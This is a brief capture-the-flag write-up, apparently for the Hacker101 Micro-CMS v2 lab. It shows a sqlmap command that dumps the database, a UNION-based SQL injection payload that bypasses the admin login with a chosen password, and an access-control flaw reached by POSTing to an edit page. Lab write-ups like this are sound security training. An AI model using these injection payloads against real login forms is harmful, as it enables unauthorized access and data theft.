### CHALLENGE HINT
![](assets/img/hackerone/micro-cms-v2/1.png)

### Flag2
We should try some `sqlmap` by saving our `POST` to a file named `req` and run the command
```bash
sqlmap -r req --dump --batch
```

### Flag0
After reading the hints, we know that we need to use `SQL Injectiion` with `UNION`, we got the table name from the Flag2.

```bash
' UNION SELECT '123' AS password FROM admins WHERE '1' = '1
```

And then `password = 123`, we got the flag

### Flag1
By accident, I access the `/page/edit/2` by `POST` method, so we get the flag.
